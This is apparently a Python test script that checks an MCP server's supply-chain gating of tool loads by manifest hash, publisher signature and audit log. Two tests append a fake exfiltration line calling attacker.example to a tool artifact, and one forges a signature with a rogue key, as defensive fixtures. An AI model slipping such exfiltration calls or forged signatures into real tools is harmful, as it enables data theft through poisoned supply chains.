"""
MCP04 — Supply Chain Verification Test
-------------------------------------------
Run this to test the supply chain verification pattern end to end.
Make sure server.py is running first in another terminal.

Usage:
    python test_mcp04.py
"""

import asyncio

import httpx

from supply_chain import COMPLIANCE_CHECKER_ARTIFACT, ROGUE_VENDOR, sha256_hex

MCP_SERVER_URL = "http://localhost:8004"


async def load(client: httpx.AsyncClient, tool_name: str, artifact: bytes, params: dict = None) -> httpx.Response:
    return await client.post(
        f"{MCP_SERVER_URL}/tools/call",
        json={"tool_name": tool_name, "artifact": artifact.decode("utf-8"), "params": params or {}},
    )


async def publish(
    client: httpx.AsyncClient, tool_name: str, publisher_id: str, artifact: bytes, signature_hex: str
) -> httpx.Response:
    return await client.post(
        f"{MCP_SERVER_URL}/manifest/publish",
        json={
            "tool_name": tool_name,
            "publisher_id": publisher_id,
            "artifact": artifact.decode("utf-8"),
            "signature_hex": signature_hex,
        },
    )


async def test_verified_tool_loads_and_executes(client: httpx.AsyncClient) -> bool:
    print("Test 1: Verified tool loads and executes successfully")
    response = await load(client, "compliance_checker", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})

    ok = response.status_code == 200 and response.json().get("verification") == "passed"
    print(f"  {'✅' if ok else '❌'} Status: {response.status_code}\n")
    return ok


async def test_wrong_hash_rejected_before_execution(client: httpx.AsyncClient) -> bool:
    print("Test 2: Tool with wrong hash rejected before execution -> 409")
    corrupted_artifact = b"def compliance_checker(device_id):\n    return CORRUPTED_DURING_TRANSFER\n"

    response = await load(client, "compliance_checker", corrupted_artifact, {"device_id": "D-1042"})

    ok = response.status_code == 409
    print(f"  {'✅' if ok else '❌'} Status: {response.status_code}\n")
    return ok


async def test_unknown_tool_not_in_manifest_rejected(client: httpx.AsyncClient) -> bool:
    print("Test 3: Unknown tool not in manifest rejected -> 404")
    response = await load(client, "compliance_checker_v2", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})

    ok = response.status_code == 404
    print(f"  {'✅' if ok else '❌'} Status: {response.status_code}\n")
    return ok


async def test_invalid_signature_rejected(client: httpx.AsyncClient) -> bool:
    print("Test 4: Tool with invalid signature rejected -> 401")
    backdoor_artifact = COMPLIANCE_CHECKER_ARTIFACT + b"\n# exfiltrate_to('http://attacker.example/collect')\n"
    forged_hash = sha256_hex(backdoor_artifact)
    # ROGUE_VENDOR is a real keypair, but not acme-security's — the
    # signature will not verify against acme-security's public key.
    forged_signature = ROGUE_VENDOR.sign_hash(forged_hash)

    response = await publish(client, "compliance_checker_v2", "acme-security", backdoor_artifact, forged_signature)

    ok = response.status_code == 401
    print(f"  {'✅' if ok else '❌'} Status: {response.status_code}\n")
    return ok


async def test_tampered_tool_detected_even_with_correct_name(client: httpx.AsyncClient) -> bool:
    print("Test 5: Tampered tool detected even with correct name -> 409")
    # Same tool_name as the manifest expects, content altered to look
    # legitimate while carrying a backdoor — the attack_demo.py scenario.
    backdoor_artifact = COMPLIANCE_CHECKER_ARTIFACT + b"\n# exfiltrate_to('http://attacker.example/collect')\n"

    response = await load(client, "compliance_checker", backdoor_artifact, {"device_id": "D-1042"})

    ok = response.status_code == 409
    print(f"  {'✅' if ok else '❌'} Status: {response.status_code}\n")
    return ok


async def test_audit_log_captures_every_load_attempt(client: httpx.AsyncClient) -> bool:
    print("Test 6: Audit log captures every load attempt")
    before = await client.get(f"{MCP_SERVER_URL}/audit-log")
    before_count = len(before.json()["entries"])

    await load(client, "compliance_checker", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})
    await load(client, "nonexistent_tool", COMPLIANCE_CHECKER_ARTIFACT, {"device_id": "D-1042"})

    after = await client.get(f"{MCP_SERVER_URL}/audit-log")
    after_count = len(after.json()["entries"])

    ok = after_count >= before_count + 2
    print(f"  {'✅' if ok else '❌'} Entries before: {before_count}, after: {after_count}\n")
    return ok


async def main():
    print("\n" + "=" * 60)
    print("MCP04 — Supply Chain Verification Test")
    print("=" * 60)
    print("Verifying tool loads are gated by manifest hash + publisher signature\n")

    results = []
    async with httpx.AsyncClient() as client:
        results.append(await test_verified_tool_loads_and_executes(client))
        results.append(await test_wrong_hash_rejected_before_execution(client))
        results.append(await test_unknown_tool_not_in_manifest_rejected(client))
        results.append(await test_invalid_signature_rejected(client))
        results.append(await test_tampered_tool_detected_even_with_correct_name(client))
        results.append(await test_audit_log_captures_every_load_attempt(client))

    passed = sum(results)
    print("=" * 60)
    print(f"Results: {passed}/{len(results)} passed")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
